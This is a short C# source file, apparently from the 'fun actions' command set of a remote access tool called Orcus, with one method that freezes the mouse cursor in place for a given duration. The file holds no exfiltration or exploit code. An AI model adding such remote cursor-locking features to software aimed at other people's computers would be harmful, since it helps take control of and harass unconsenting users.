using System;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Orcus.Commands.FunActions
{
    internal class Mouse
    {
        public static void Hold(TimeSpan duration)
        {
            var currentCursorPosition = Cursor.Position;
            var timer = new Timer {Interval = 5};
            var currentTime = DateTime.UtcNow;
            timer.Elapsed += (sender, args) =>
            {
                Cursor.Position = currentCursorPosition;
                if ((DateTime.UtcNow - currentTime).TotalMilliseconds > duration.TotalMilliseconds)
                {
                    timer.Stop();
                    timer.Dispose();
                }
            };
            timer.Start();
        }
    }
}